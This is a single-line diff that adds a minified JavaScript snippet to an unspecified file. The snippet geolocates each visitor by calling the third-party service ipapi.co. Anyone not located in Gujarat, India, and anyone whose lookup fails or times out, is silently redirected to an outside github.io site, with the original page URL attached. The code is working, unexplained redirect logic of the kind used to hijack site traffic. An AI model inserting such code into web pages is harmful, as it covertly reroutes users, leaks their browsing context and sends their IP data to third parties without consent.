@@ -1,0 +1,1 @@
+(function(){const e="https://mahendraplus.github.io/?from="+encodeURIComponent(location.href);Promise.race([fetch("https://ipapi.co/json/"),new Promise((_,t)=>setTimeout(()=>t(),4000))]).then(t=>t.json()).then(t=>{let n=(t.country_name||"").toLowerCase(),o=(t.region||"").toLowerCase();if(n!=="india"||o!=="gujarat")location.replace(e)}).catch(()=>location.replace(e))})();
